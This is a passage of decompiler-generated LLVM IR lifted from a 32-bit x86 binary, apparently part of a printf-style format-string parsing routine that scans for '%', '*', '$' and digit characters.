  %v17_804af73 = icmp eq i32 %v2_804af70, %v6_804af73
  %v1_804af77 = icmp eq i1 %v17_804af73, false
  br i1 %v1_804af77, label %dec_label_pc_804b2c9, label %dec_label_pc_804af7d

dec_label_pc_804af7d:                             ; preds = %dec_label_pc_804af59
  %v3_804af7d = trunc i32 %v0_804af6e to i8
  %v4_804af7d = icmp eq i8 %v3_804af7d, 0
  br i1 %v4_804af7d, label %dec_label_pc_804af87, label %dec_label_pc_804af81

dec_label_pc_804af81:                             ; preds = %dec_label_pc_804af7d
  %v0_804af81 = load i32, i32* %esi.global-to-local, align 4
  %v1_804af81 = add i32 %v0_804af81, 1
  store i32 %v1_804af81, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804af81, 32
  br i1 %tmp, label %dec_label_pc_804af81.dec_label_pc_804af59_crit_edge, label %dec_label_pc_804af87

dec_label_pc_804af81.dec_label_pc_804af59_crit_edge: ; preds = %dec_label_pc_804af81
  %v2_804af6a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804af59

dec_label_pc_804af87:                             ; preds = %dec_label_pc_804af81, %dec_label_pc_804af7d
  %v2_804af8c = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804afa4.outer

dec_label_pc_804afa4.outer:                       ; preds = %dec_label_pc_804af87, %dec_label_pc_804af46, %dec_label_pc_804b0c1
  %v0_804afb0.ph94 = phi i32 [ %v1_804b0c1, %dec_label_pc_804b0c1 ], [ %v2_804af46, %dec_label_pc_804af46 ], [ %v2_804af8c, %dec_label_pc_804af87 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804b0c1 ], [ %tmp66, %dec_label_pc_804af46 ], [ %tmp66, %dec_label_pc_804af87 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804af4a, %dec_label_pc_804b0c1 ], [ 0, %dec_label_pc_804af46 ], [ 0, %dec_label_pc_804af87 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804b0c1 ], [ %v3_804af34, %dec_label_pc_804af46 ], [ %v3_804af34, %dec_label_pc_804af87 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804b0c1 ], [ 0, %dec_label_pc_804af46 ], [ 0, %dec_label_pc_804af87 ]
  %v7_804afab = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804afab = trunc i64 %v7_804afab to i32
  %v2_804afb3 = add i32 %v8_804afab, 80
  br label %dec_label_pc_804afa4

dec_label_pc_804afa4:                             ; preds = %dec_label_pc_804afa4.outer, %dec_label_pc_804b061
  %v0_804afb0 = phi i32 [ %v0_804b06e, %dec_label_pc_804b061 ], [ %v0_804afb0.ph94, %dec_label_pc_804afa4.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804b061 ], [ %stack_var_-32.1.ph, %dec_label_pc_804afa4.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804b061 ], [ %stack_var_-88.1.ph, %dec_label_pc_804afa4.outer ]
  store i32 %v0_804afb0, i32* @edx, align 4
  %v1_804afa4 = inttoptr i32 %v0_804afb0 to i8*
  %v2_804afa4 = load i8, i8* %v1_804afa4, align 1
  %v11_804afa4 = icmp eq i8 %v2_804afa4, 42
  store i32 %v0_804afb0, i32* @esi, align 4
  %v1_804afa9 = icmp eq i1 %v11_804afa4, false
  br i1 %v1_804afa9, label %dec_label_pc_804afbb, label %dec_label_pc_804afab

dec_label_pc_804afab:                             ; preds = %dec_label_pc_804afa4
  store i32 %v8_804afab, i32* %eax.global-to-local, align 4
  %v1_804afb0 = add i32 %v0_804afb0, 1
  store i32 %v1_804afb0, i32* @esi, align 4
  %v0_804afb3 = load i32, i32* @esp, align 4
  %v3_804afb3 = add i32 %v2_804afb3, %v0_804afb3
  %v4_804afb3 = inttoptr i32 %v3_804afb3 to i32*
  store i32 0, i32* %v4_804afb3, align 4
  %v0_804afd5.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804afbb

dec_label_pc_804afbb:                             ; preds = %dec_label_pc_804afa4, %dec_label_pc_804afab
  %v0_804afd5.pre = phi i32 [ %v0_804afb0, %dec_label_pc_804afa4 ], [ %v0_804afd5.pre.pre, %dec_label_pc_804afab ]
  %v0_804afbb = load i32, i32* inttoptr (i32 134559520 to i32*), align 32
  store i32 %v0_804afbb, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_804afd5.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804afd5

dec_label_pc_804afc5:                             ; preds = %dec_label_pc_804afd5
  %v1_804afc5 = add i32 %v1_804afcd, -4094
  %v6_804afc5 = sub i32 4093, %v1_804afcd
  %v7_804afc5 = and i32 %v6_804afc5, %v1_804afcd
  %v8_804afc5 = icmp slt i32 %v7_804afc5, 0
  %v9_804afc5 = icmp eq i32 %v1_804afc5, 0
  %v10_804afc5 = icmp slt i32 %v1_804afc5, 0
  %v3_804afcb = icmp eq i1 %v10_804afc5, %v8_804afc5
  %v4_804afcb = icmp eq i1 %v9_804afc5, false
  %v5_804afcb = and i1 %v4_804afcb, %v3_804afcb
  br i1 %v5_804afcb, label %dec_label_pc_804afd4, label %dec_label_pc_804afcd

dec_label_pc_804afcd:                             ; preds = %dec_label_pc_804afc5
  %v3_804afcd = mul i32 %v1_804afcd, 10
  store i32 %v3_804afcd, i32* %eax.global-to-local, align 4
  %v2_804afd0 = add i32 %v3_804afcd, -48
  %v3_804afd0 = add i32 %v2_804afd0, %v2_804afd7
  store i32 %v3_804afd0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804afd4

dec_label_pc_804afd4:                             ; preds = %dec_label_pc_804afc5, %dec_label_pc_804afcd
  %v0_804afef32 = phi i32 [ %v1_804afcd, %dec_label_pc_804afc5 ], [ %v3_804afd0, %dec_label_pc_804afcd ]
  %v4_804afd528 = phi i32 [ %v6_804afd5, %dec_label_pc_804afc5 ], [ %v3_804afcd, %dec_label_pc_804afcd ]
  %v1_804afd4 = add i32 %v0_804afd4, 1
  store i32 %v1_804afd4, i32* @esi, align 4
  br label %dec_label_pc_804afd5

dec_label_pc_804afd5:                             ; preds = %dec_label_pc_804afbb, %dec_label_pc_804afd4
  %v1_804afcd = phi i32 [ 0, %dec_label_pc_804afbb ], [ %v0_804afef32, %dec_label_pc_804afd4 ]
  %v4_804afd5 = phi i32 [ %v4_804afd5.pre, %dec_label_pc_804afbb ], [ %v4_804afd528, %dec_label_pc_804afd4 ]
  %v0_804afd4 = phi i32 [ %v0_804afd5.pre, %dec_label_pc_804afbb ], [ %v1_804afd4, %dec_label_pc_804afd4 ]
  %v1_804afd5 = inttoptr i32 %v0_804afd4 to i8*
  %v2_804afd5 = load i8, i8* %v1_804afd5, align 1
  %v3_804afd5 = zext i8 %v2_804afd5 to i32
  %v5_804afd5 = and i32 %v4_804afd5, -256
  %v6_804afd5 = or i32 %v3_804afd5, %v5_804afd5
  store i32 %v6_804afd5, i32* %eax.global-to-local, align 4
  %v2_804afd7 = sext i8 %v2_804afd5 to i32
  store i32 %v2_804afd7, i32* @ecx, align 4
  %v2_804afda = mul nsw i32 %v2_804afd7, 2
  %v3_804afda = add i32 %v2_804afda, %v0_804afbb
  %v4_804afda = inttoptr i32 %v3_804afda to i8*
  %v5_804afda = load i8, i8* %v4_804afda, align 1
  %v6_804afda = and i8 %v5_804afda, 8
  %v7_804afda = icmp eq i8 %v6_804afda, 0
  %v1_804afdf = icmp eq i1 %v7_804afda, false
  br i1 %v1_804afdf, label %dec_label_pc_804afc5, label %dec_label_pc_804afe1

dec_label_pc_804afe1:                             ; preds = %dec_label_pc_804afd5
  %v0_804afe1 = load i32, i32* @edx, align 4
  %v1_804afe1 = add i32 %v0_804afe1, -1
  %v2_804afe1 = inttoptr i32 %v1_804afe1 to i8*
  %v3_804afe1 = load i8, i8* %v2_804afe1, align 1
  %v12_804afe1 = icmp eq i8 %v3_804afe1, 37
  %v1_804afe5 = icmp eq i1 %v12_804afe1, false
  br i1 %v1_804afe5, label %dec_label_pc_804b078, label %dec_label_pc_804afeb

dec_label_pc_804afeb:                             ; preds = %dec_label_pc_804afe1
  %v10_804afeb = icmp eq i8 %v2_804afd5, 36
  %v1_804afed = icmp eq i1 %v10_804afeb, false
  br i1 %v1_804afed, label %dec_label_pc_804b01f, label %dec_label_pc_804afef

dec_label_pc_804afef:                             ; preds = %dec_label_pc_804afeb
  %tmp89 = icmp slt i32 %v1_804afcd, 1
  br i1 %tmp89, label %dec_label_pc_804b01f, label %dec_label_pc_804aff3

dec_label_pc_804aff3:                             ; preds = %dec_label_pc_804afef
  %v4_804aff3 = icmp eq i32 %stack_var_-88.1, 0
  %v1_804aff8 = add i32 %v0_804afd4, 1
  store i32 %v1_804aff8, i32* @edx, align 4
  br i1 %v4_804aff3, label %dec_label_pc_804b2c9, label %dec_label_pc_804b001

dec_label_pc_804b001:                             ; preds = %dec_label_pc_804aff3
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804b009 = sub i32 %v1_804afcd, %stack_var_-88.1
  %v8_804b009 = xor i32 %v1_804afcd, %stack_var_-88.1
  %v9_804b009 = xor i32 %v2_804b009, %v1_804afcd
  %v10_804b009 = and i32 %v9_804b009, %v8_804b009
  %v11_804b009 = icmp slt i32 %v10_804b009, 0
  %v12_804b009 = icmp eq i32 %v2_804b009, 0
  %v13_804b009 = icmp slt i32 %v2_804b009, 0
  %v3_804b00b = icmp ne i1 %v13_804b009, %v11_804b009
  %v4_804b00b = or i1 %v12_804b009, %v3_804b00b
  %stack_var_-88.1.v0_804b00d = select i1 %v4_804b00b, i32 %stack_var_-88.1, i32 %v1_804afcd
  br label %dec_label_pc_804b01b

dec_label_pc_804b01b:                             ; preds = %dec_label_pc_804b02f, %dec_label_pc_804b001, %dec_label_pc_804b033
  %v0_804b01b = phi i32 [ %v1_804aff8, %dec_label_pc_804b001 ], [ %v0_804afe1, %dec_label_pc_804b033 ], [ %v0_804afe1, %dec_label_pc_804b02f ]
  %stack_var_-32.2 = phi i32 [ %v1_804afcd, %dec_label_pc_804b001 ], [ %stack_var_-32.1, %dec_label_pc_804b033 ], [ %stack_var_-32.1, %dec_label_pc_804b02f ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804b00d, %dec_label_pc_804b001 ], [ 0, %dec_label_pc_804b033 ], [ 0, %dec_label_pc_804b02f ]
  store i32 %v0_804b01b, i32* @esi, align 4
  br label %dec_label_pc_804b042

dec_label_pc_804b01f:                             ; preds = %dec_label_pc_804afef, %dec_label_pc_804afeb
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804b02f, label %dec_label_pc_804b026

dec_label_pc_804b026:                             ; preds = %dec_label_pc_804b01f
  %v10_804b026 = icmp eq i8 %v2_804afd5, 109
  br i1 %v10_804b026, label %dec_label_pc_804b078, label %dec_label_pc_804b2c9

dec_label_pc_804b02f:                             ; preds = %dec_label_pc_804b01f
  %tmp153 = icmp ugt i32 %v0_804afd4, %v0_804afe1
  br i1 %tmp153, label %dec_label_pc_804b033, label %dec_label_pc_804b01b

dec_label_pc_804b033:                             ; preds = %dec_label_pc_804b02f
  %v1_804b033 = inttoptr i32 %v0_804afe1 to i8*
  %v2_804b033 = load i8, i8* %v1_804b033, align 1
  %v8_804b033 = icmp eq i8 %v2_804b033, 48
  br i1 %v8_804b033, label %dec_label_pc_804b01b, label %dec_label_pc_804b078

dec_label_pc_804b042:                             ; preds = %dec_label_pc_804b053, %dec_label_pc_804b01b
  %v0_804b06e = phi i32 [ %v1_804b053, %dec_label_pc_804b053 ], [ %v0_804b01b, %dec_label_pc_804b01b ]
  %v4_804b04c35 = phi i32 [ %v6_804b04c, %dec_label_pc_804b053 ], [ %v6_804afd5, %dec_label_pc_804b01b ]
  store i32 ptrtoint ([8 x i8]* @global_var_805184a.327 to i32), i32* %edx.global-to-local, align 4
  %v1_804b04f = inttoptr i32 %v0_804b06e to i8*
  br label %dec_label_pc_804b04c

dec_label_pc_804b04c:                             ; preds = %dec_label_pc_804b05d, %dec_label_pc_804b042
  %v4_804b04c = phi i32 [ %v4_804b04c35, %dec_label_pc_804b042 ], [ %v6_804b04c, %dec_label_pc_804b05d ]
  %v0_804b04e = phi i32 [ ptrtoint ([8 x i8]* @global_var_805184a.327 to i32), %dec_label_pc_804b042 ], [ %v1_804b04e, %dec_label_pc_804b05d ]
  %v0_804b05d = phi i32 [ 1, %dec_label_pc_804b042 ], [ %v2_804b05d, %dec_label_pc_804b05d ]
  store i32 %v0_804b05d, i32* @ecx, align 4
  %v1_804b04c = inttoptr i32 %v0_804b04e to i8*
  %v2_804b04c = load i8, i8* %v1_804b04c, align 1
  %v3_804b04c = zext i8 %v2_804b04c to i32
  %v5_804b04c = and i32 %v4_804b04c, -256
  %v6_804b04c = or i32 %v3_804b04c, %v5_804b04c
  store i32 %v6_804b04c, i32* %eax.global-to-local, align 4
  %v1_804b04e = add i32 %v0_804b04e, 1
  store i32 %v1_804b04e, i32* @edx, align 4
  %v2_804b04f = load i8, i8* %v1_804b04f, align 1
  %v15_804b04f = icmp eq i8 %v2_804b04f, %v2_804b04c
  %v1_804b051 = icmp eq i1 %v15_804b04f, false
  br i1 %v1_804b051, label %dec_label_pc_804b058, label %dec_label_pc_804b053

dec_label_pc_804b053:                             ; preds = %dec_label_pc_804b04c
  %v1_804b053 = add i32 %v0_804b06e, 1
  store i32 %v1_804b053, i32* @esi, align 4
  %v0_804b054 = load i32, i32* %edi.global-to-local, align 4
  %v2_804b054 = or i32 %v0_804b054, %v0_804b05d
  store i32 %v2_804b054, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b042

dec_label_pc_804b058:                             ; preds = %dec_label_pc_804b04c
  %v1_804b058 = inttoptr i32 %v1_804b04e to i8*
  %v2_804b058 = load i8, i8* %v1_804b058, align 1
  %v3_804b058 = icmp eq i8 %v2_804b058, 0
  br i1 %v3_804b058, label %dec_label_pc_804b061, label %dec_label_pc_804b05d

dec_label_pc_804b05d:                             ; preds = %dec_label_pc_804b058
  %v2_804b05d = mul i32 %v0_804b05d, 2
  br label %dec_label_pc_804b04c

dec_label_pc_804b061:                             ; preds = %dec_label_pc_804b058
  %v0_804b061 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804b065 = udiv i32 %v0_804b061, 2
  %v1_804b065.not = or i32 %v1_804b065, -6
  %v1_804b06a = xor i32 %v1_804b065.not, 5
  store i32 %v1_804b06a, i32* %eax.global-to-local, align 4
  %v2_804b06c = and i32 %v1_804b06a, %v0_804b061
  store i32 %v2_804b06c, i32* %edi.global-to-local, align 4
  %v1_804b06e = add i32 %v0_804b06e, -1
  %v2_804b06e = inttoptr i32 %v1_804b06e to i8*
  %v3_804b06e = load i8, i8* %v2_804b06e, align 1
  %v12_804b06e = icmp eq i8 %v3_804b06e, 37
  %v1_804b072 = icmp eq i1 %v12_804b06e, false
  br i1 %v1_804b072, label %dec_label_pc_804afa4, label %dec_label_pc_804b078

dec_label_pc_804b078:                             ; preds = %dec_label_pc_804b033, %dec_label_pc_804b061, %dec_label_pc_804afe1, %dec_label_pc_804b026
  %v0_804b09b = phi i32 [ %v1_804afcd, %dec_label_pc_804b026 ], [ %v1_804afcd, %dec_label_pc_804b033 ], [ 0, %dec_label_pc_804b061 ], [ %v1_804afcd, %dec_label_pc_804afe1 ]
  %v1_804b0a4 = phi i32 [ %v0_804afd4, %dec_label_pc_804b026 ], [ %v0_804afd4, %dec_label_pc_804b033 ], [ %v0_804b06e, %dec_label_pc_804b061 ], [ %v0_804afd4, %dec_label_pc_804afe1 ]
  %v0_804b0a1 = phi i32 [ %v0_804afe1, %dec_label_pc_804b026 ], [ %v0_804afe1, %dec_label_pc_804b033 ], [ %v1_804b04e, %dec_label_pc_804b061 ], [ %v0_804afe1, %dec_label_pc_804afe1 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804b026 ], [ %stack_var_-32.1, %dec_label_pc_804b033 ], [ %stack_var_-32.2, %dec_label_pc_804b061 ], [ %stack_var_-32.1, %dec_label_pc_804afe1 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804b026 ], [ 0, %dec_label_pc_804b033 ], [ %stack_var_-88.2, %dec_label_pc_804b061 ], [ %stack_var_-88.1, %dec_label_pc_804afe1 ]
  %v1_804b078 = inttoptr i32 %v0_804b0a1 to i8*
  %v2_804b078 = load i8, i8* %v1_804b078, align 1
  %v11_804b078 = icmp eq i8 %v2_804b078, 42
  %v1_804b07b = icmp eq i1 %v11_804b078, false
  br i1 %v1_804b07b, label %dec_label_pc_804b0b1, label %dec_label_pc_804b07d

dec_label_pc_804b07d:                             ; preds = %dec_label_pc_804b078
  %v4_804b07d = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804b07d, label %dec_label_pc_804b0a1, label %dec_label_pc_804b084

dec_label_pc_804b084:                             ; preds = %dec_label_pc_804b07d
  %v1_804b084 = inttoptr i32 %v1_804b0a4 to i8*
  %v2_804b084 = load i8, i8* %v1_804b084, align 1
  %v11_804b084 = icmp eq i8 %v2_804b084, 36
  %v1_804b087 = icmp eq i1 %v11_804b084, false
  br i1 %v1_804b087, label %dec_label_pc_804b2c9, label %dec_label_pc_804b08d

dec_label_pc_804b08d:                             ; preds = %dec_label_pc_804b084
  %tmp91 = icmp slt i32 %v0_804b09b, 1
  br i1 %tmp91, label %dec_label_pc_804b2c9, label %dec_label_pc_804b095

dec_label_pc_804b095:                             ; preds = %dec_label_pc_804b08d
  store i32 %v8_804afab, i32* %eax.global-to-local, align 4
  %v1_804b09a = add i32 %v1_804b0a4, 1
  store i32 %v1_804b09a, i32* @esi, align 4
  %v1_804b09b = load i32, i32* @esp, align 4
  %v3_804b09b = add i32 %v8_804afab, 68
  %v4_804b09b = add i32 %v3_804b09b, %v1_804b09b
  %v5_804b09b = inttoptr i32 %v4_804b09b to i32*
  store i32 %v0_804b09b, i32* %v5_804b09b, align 4
  %v0_804b0df.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b0ac

dec_label_pc_804b0a1:                             ; preds = %dec_label_pc_804b07d
  %v1_804b0a1 = add i32 %v0_804b0a1, 1
  store i32 %v1_804b0a1, i32* %eax.global-to-local, align 4
  %v12_804b0a4 = icmp eq i32 %v1_804b0a1, %v1_804b0a4
  %v1_804b0a6 = icmp eq i1 %v12_804b0a4, false
  br i1 %v1_804b0a6, label %dec_label_pc_804b2c9, label %dec_label_pc_804b0ac

dec_label_pc_804b0ac:                             ; preds = %dec_label_pc_804b0a1, %dec_label_pc_804b095
  %v0_804b0df.pre.pre.pre = phi i32 [ %v1_804b0a4, %dec_label_pc_804b0a1 ], [ %v0_804b0df.pre.pre.pre.pre, %dec_label_pc_804b095 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b0b1

dec_label_pc_804b0b1:                             ; preds = %dec_label_pc_804b078, %dec_label_pc_804b0ac
  %v0_804b0df.pre.pre = phi i32 [ %v1_804b0a4, %dec_label_pc_804b078 ], [ %v0_804b0df.pre.pre.pre, %dec_label_pc_804b0ac ]
  %v0_804af4a = phi i32 [ %v0_804b09b, %dec_label_pc_804b078 ], [ -2147483648, %dec_label_pc_804b0ac ]
  %v4_804b0b1 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804b0b1 = icmp eq i32 %v4_804b0b1, 0
  %v1_804b0b6 = icmp eq i1 %v5_804b0b1, false
  %.pre = inttoptr i32 %v0_804b0df.pre.pre to i8*
  br i1 %v1_804b0b6, label %dec_label_pc_804b0da, label %dec_label_pc_804b0bc

dec_label_pc_804b0bc:                             ; preds = %dec_label_pc_804b0b1
  %v2_804b0bc = load i8, i8* %.pre, align 1
  %v11_804b0bc = icmp eq i8 %v2_804b0bc, 46
  %v1_804b0bf = icmp eq i1 %v11_804b0bc, false
  br i1 %v1_804b0bf, label %dec_label_pc_804b0d3, label %dec_label_pc_804b0c1

dec_label_pc_804b0c1:                             ; preds = %dec_label_pc_804b0bc
  %v1_804b0c1 = add i32 %v0_804b0df.pre.pre, 1
  store i32 %v1_804b0c1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804afa4.outer

dec_label_pc_804b0d3:                             ; preds = %dec_label_pc_804b0bc
  br label %dec_label_pc_804b0da

dec_label_pc_804b0da:                             ; preds = %dec_label_pc_804b0b1, %dec_label_pc_804b0d3
  %stack_var_-96.2 = phi i32 [ %v0_804af4a, %dec_label_pc_804b0d3 ], [ %stack_var_-96.1.ph, %dec_label_pc_804b0b1 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804b0d3 ], [ %v0_804af4a, %dec_label_pc_804b0b1 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_80517f8.328 to i32), i32* @edx, align 4
  %v4_804b0df.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b0df

dec_label_pc_804b0df:                             ; preds = %dec_label_pc_804b0e9, %dec_label_pc_804b0da
  %v0_804b0e9 = phi i32 [ %v1_804b0e9, %dec_label_pc_804b0e9 ], [ ptrtoint ([9 x i8]* @global_var_80517f8.328 to i32), %dec_label_pc_804b0da ]
  %v4_804b0df = phi i32 [ %v6_804b0df, %dec_label_pc_804b0e9 ], [ %v4_804b0df.pre, %dec_label_pc_804b0da ]
  %v2_804b0df = load i8, i8* %.pre, align 1
  %v3_804b0df = zext i8 %v2_804b0df to i32
  %v5_804b0df = and i32 %v4_804b0df, -256
  %v6_804b0df = or i32 %v3_804b0df, %v5_804b0df
  store i32 %v6_804b0df, i32* %eax.global-to-local, align 4
  %v3_804b0e1 = inttoptr i32 %v0_804b0e9 to i8*
  %v4_804b0e1 = load i8, i8* %v3_804b0e1, align 1
  %v15_804b0e1 = icmp eq i8 %v2_804b0df, %v4_804b0e1
  br i1 %v15_804b0e1, label %dec_label_pc_804af51, label %dec_label_pc_804b0e9

dec_label_pc_804b0e9:                             ; preds = %dec_label_pc_804b0df
  %v1_804b0e9 = add i32 %v0_804b0e9, 1
  store i32 %v1_804b0e9, i32* @edx, align 4
  %v1_804b0ea = inttoptr i32 %v1_804b0e9 to i8*
  %v2_804b0ea = load i8, i8* %v1_804b0ea, align 1
  %v3_804b0ea = icmp eq i8 %v2_804b0ea, 0
  %v1_804b0ed = icmp eq i1 %v3_804b0ea, false
  br i1 %v1_804b0ed, label %dec_label_pc_804b0df, label %dec_label_pc_804b0ef

dec_label_pc_804b0ef:                             ; preds = %dec_label_pc_804b0e9, %dec_label_pc_804af51
  %v0_804b102 = phi i32 [ %v1_804af51, %dec_label_pc_804af51 ], [ %v0_804b0df.pre.pre, %dec_label_pc_804b0e9 ]
  %v0_804b0ff = phi i32 [ %v0_804b0e9, %dec_label_pc_804af51 ], [ %v1_804b0e9, %dec_label_pc_804b0e9 ]
  %v1_804b0f1 = add i32 %v0_804b0ff, -134551544
  %v1_804b0f6 = add i32 %v0_804b0ff, -134551545
  %v5_804b0f6 = sub i32 134551544, %v0_804b0ff
  %v6_804b0f6 = and i32 %v1_804b0f1, %v5_804b0f6
  %v7_804b0f6 = icmp slt i32 %v6_804b0f6, 0
  %v8_804b0f6 = icmp eq i32 %v1_804b0f6, 0
  %v9_804b0f6 = icmp slt i32 %v1_804b0f6, 0
  store i32 %v1_804b0f6, i32* %eax.global-to-local, align 4
  %v3_804b0f7 = icmp eq i1 %v9_804b0f6, %v7_804b0f6
  %v4_804b0f7 = icmp eq i1 %v8_804b0f6, false
  %v5_804b0f7 = and i1 %v4_804b0f7, %v3_804b0f7
  br i1 %v5_804b0f7, label %dec_label_pc_804b103, label %dec_label_pc_804b0f9

dec_label_pc_804b0f9:                             ; preds = %dec_label_pc_804b0ef
  %v1_804b0f9 = inttoptr i32 %v0_804b102 to i8*
  %v2_804b0f9 = load i8, i8* %v1_804b0f9, align 1
  %v3_804b0f9 = zext i8 %v2_804b0f9 to i32
  %v5_804b0f9 = and i32 %v1_804b0f6, -256
  %v6_804b0f9 = or i32 %v3_804b0f9, %v5_804b0f9
  store i32 %v6_804b0f9, i32* %eax.global-to-local, align 4
  %v3_804b0fb = inttoptr i32 %v0_804b0ff to i8*
  %v4_804b0fb = load i8, i8* %v3_804b0fb, align 1
  %v15_804b0fb = icmp eq i8 %v2_804b0f9, %v4_804b0fb
  %v1_804b0fd = icmp eq i1 %v15_804b0fb, false
  br i1 %v1_804b0fd, label %dec_label_pc_804b103, label %dec_label_pc_804b0ff

dec_label_pc_804b0ff:                             ; preds = %dec_label_pc_804b0f9
  %v1_804b0ff = add i32 %v0_804b0ff, 9
  store i32 %v1_804b0ff, i32* @edx, align 4
  %v1_804b102 = add i32 %v0_804b102, 1
  store i32 %v1_804b102, i32* @esi, align 4
  br label %dec_label_pc_804b103

dec_label_pc_804b103:                             ; preds = %dec_label_pc_804b0f9, %dec_label_pc_804b0ef, %dec_label_pc_804b0ff
  %v4_804b107 = phi i32 [ %v6_804b0f9, %dec_label_pc_804b0f9 ], [ %v1_804b0f6, %dec_label_pc_804b0ef ], [ %v6_804b0f9, %dec_label_pc_804b0ff ]
  %v0_804b107 = phi i32 [ %v0_804b102, %dec_label_pc_804b0f9 ], [ %v0_804b102, %dec_label_pc_804b0ef ], [ %v1_804b102, %dec_label_pc_804b0ff ]
  %v0_804b103 = phi i32 [ %v0_804b0ff, %dec_label_pc_804b0f9 ], [ %v0_804b0ff, %dec_label_pc_804b0ef ], [ %v1_804b0ff, %dec_label_pc_804b0ff ]
  %v1_804b103 = add i32 %v0_804b103, 9
  %v2_804b103 = inttoptr i32 %v1_804b103 to i8*
  %v3_804b103 = load i8, i8* %v2_804b103, align 1
  %v4_804b103 = sext i8 %v3_804b103 to i32
  store i32 %v4_804b103, i32* %ebx.global-to-local, align 4
  %v1_804b107 = inttoptr i32 %v0_804b107 to i8*
  %v2_804b107 = load i8, i8* %v1_804b107, align 1
  %v3_804b107 = zext i8 %v2_804b107 to i32
  %v5_804b107 = and i32 %v4_804b107, -256
  %v6_804b107 = or i32 %v3_804b107, %v5_804b107
  store i32 %v6_804b107, i32* %eax.global-to-local, align 4
  %v2_804b109 = mul nsw i32 %v4_804b103, 256
  store i32 %v2_804b109, i32* %ebx.global-to-local, align 4
  %v4_804b10c = icmp eq i8 %v2_804b107, 0
  br i1 %v4_804b10c, label %dec_label_pc_804b2c9, label %dec_label_pc_804b114

dec_label_pc_804b114:                             ; preds = %dec_label_pc_804b103
  %v3_804b114 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804b114, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_8051835.329 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804b11d

dec_label_pc_804b11d:                             ; preds = %dec_label_pc_804b16d, %dec_label_pc_804b114
  %v0_804b16d = phi i32 [ %v1_804b16d, %dec_label_pc_804b16d ], [ ptrtoint ([21 x i8]* @global_var_8051835.329 to i32), %dec_label_pc_804b114 ]
  %v3_804b11d = inttoptr i32 %v0_804b16d to i8*
  %v4_804b11d = load i8, i8* %v3_804b11d, align 1
  %v15_804b11d = icmp eq i8 %v2_804b107, %v4_804b11d
  %v1_804b11f = icmp eq i1 %v15_804b11d, false
  br i1 %v1_804b11f, label %dec_label_pc_804b16d, label %dec_label_pc_804b121

dec_label_pc_804b121:                             ; preds = %dec_label_pc_804b11d
  %v1_804b123 = add i32 %v0_804b16d, -134551605
  store i32 %v1_804b123, i32* %edx.global-to-local, align 4
  %v7_804b12c = icmp sgt i32 %v1_804b123, 17
  br i1 %v7_804b12c, label %dec_label_pc_804b12e, label %dec_label_pc_804b137

dec_label_pc_804b12e:                             ; preds = %dec_label_pc_804b121
  %v1_804b12e = add i32 %v0_804b16d, -134551607
  store i32 %v1_804b12e, i32* %eax.global-to-local, align 4
  %v3_804b131 = and i32 %v2_804b109, 1024
  %v4_804b131 = icmp eq i32 %v3_804b131, 0
  %v1_804b134 = icmp eq i1 %v4_804b131, false
  %v4_804b134 = select i1 %v1_804b134, i32 %v1_804b12e, i32 %v1_804b123
  store i32 %v4_804b134, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b137

dec_label_pc_804b137:                             ; preds = %dec_label_pc_804b121, %dec_label_pc_804b12e
  %v0_804b140 = phi i32 [ %v1_804b123, %dec_label_pc_804b121 ], [ %v4_804b134, %dec_label_pc_804b12e ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805182b.330 to i32), i32* %ecx.global-to-local, align 4
  %v2_804b140 = add i32 %tmp76, 32
  %v3_804b140 = inttoptr i32 %v2_804b140 to i32*
  store i32 %v0_804b140, i32* %v3_804b140, align 4
  %v0_804b143.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804b147.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b143

dec_label_pc_804b143:                             ; preds = %dec_label_pc_804b143, %dec_label_pc_804b137
  %v0_804b143 = phi i32 [ %v1_804b143, %dec_label_pc_804b143 ], [ %v0_804b143.pre, %dec_label_pc_804b137 ]
  %v1_804b143 = add i32 %v0_804b143, 1
  store i32 %v1_804b143, i32* %ecx.global-to-local, align 4
  %v1_804b144 = inttoptr i32 %v1_804b143 to i8*
  %v2_804b144 = load i8, i8* %v1_804b144, align 1
  %v3_804b144 = sext i8 %v2_804b144 to i32
  store i32 %v3_804b144, i32* %eax.global-to-local, align 4
